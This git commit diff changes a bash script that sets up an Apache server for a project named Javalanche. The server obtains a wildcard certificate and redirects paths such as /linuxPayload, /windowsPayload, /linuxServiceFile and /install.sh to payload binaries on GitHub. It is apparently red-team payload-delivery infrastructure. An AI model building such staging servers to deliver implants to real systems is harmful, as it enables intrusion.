5564c534fa3fe4c132d7fb59cd6c7a40e7b40f5e
James Southcott <James.southcott19@gmail.com>
2026-03-16 12:29:01 -0400

    starting transition to github from gitlab

--- Setup/redirectServerSetup.sh
+++ Setup/redirectServerSetup.sh
@@ -1,6 +1,11 @@
 #!/bin/bash
+
 # Install apache web server
 sudo apt install apache2 -y
+
+apt-get update
+apt-get install -y certbot
+certbot certonly -d javalanche.net -d *.javalanche.net --agree-tos --email james.southcott19@gmail.com --manual --preferred-challenges dns
 
 # find the line number where we want to insert our lines
 linenumber=$(awk '
@@ -15,14 +20,14 @@ linenumber=$(awk '
 ' /etc/apache2/apache2.conf)
 
 sed -i "$linenumber i\\
-Redirect /linuxServiceFile https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/httpsBinary/linuxServiceFile.service?ref_type=heads\\
-Redirect /linuxPayload https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/httpsBinary/linux?ref_type=heads\\
-Redirect /windowsPayload https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/httpsBinary/windows.exe/Debug/windowsBinary.exe?ref_type=heads\\
-Redirect /install.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/install.sh?ref_type=heads\\
-Redirect / https://gitlab.ritsec.cloud/jms9508/Javalanche\\
+Redirect /linuxServiceFile https://raw.githubusercontent.com/jamessouthycoder19/Javalanche/refs/heads/main/Payloads/httpsBinary/linuxServiceFile.service\\
+Redirect /linuxPayload https://github.com/jamessouthycoder19/Javalanche/raw/refs/heads/main/Payloads/httpsBinary/linux\\
+Redirect /windowsPayload https://github.com/jamessouthycoder19/Javalanche/raw/refs/heads/main/Payloads/httpsBinary/windows.exe\\
+Redirect /install.sh https://raw.githubusercontent.com/jamessouthycoder19/Javalanche/refs/heads/main/Setup/install.sh\\
+Redirect / https://github.com/jamessouthycoder19/Javalanche\\
 " /etc/apache2/apache2.conf
 
-sudo curl -s -o /etc/apache2/sites-available/redirect-https.conf https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/redirect-https.conf?ref_type=heads
+sudo curl -s -o /etc/apache2/sites-available/redirect-https.conf https://raw.githubusercontent.com/jamessouthycoder19/Javalanche/refs/heads/main/Setup/redirect-https.conf
 
 sudo a2enmod proxy proxy_http ssl headers rewrite > /dev/null
 sudo a2ensite redirect-https.conf > /dev/null
